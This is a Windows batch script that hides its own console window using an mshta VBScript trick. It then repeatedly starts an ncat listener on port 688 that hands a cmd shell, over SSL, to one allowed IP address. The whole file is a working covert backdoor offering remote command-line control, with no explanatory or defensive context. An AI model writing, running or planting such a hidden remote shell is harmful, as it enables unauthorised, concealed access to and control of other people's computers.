@echo off
if "%1" == "h" goto begin 
mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit 
:begin 
echo Start remote connection process in hide window
set our_ip=172.20.10.12
set our_port=688
set life_cycle=999
set counter=0
for /l %%i in (1,1,%life_cycle%) do (
   set /a counter+=1
   echo The %counter% connection
   ncat -c cmd --allow %our_ip% -vnl %our_port% --ssl
   echo The %counter% disconnection
)
::If you exit and choose "Ctrl + c" instead of "exit", the program will be permanently blocked and unavailable
echo The life of remote connection program has come to an end
pause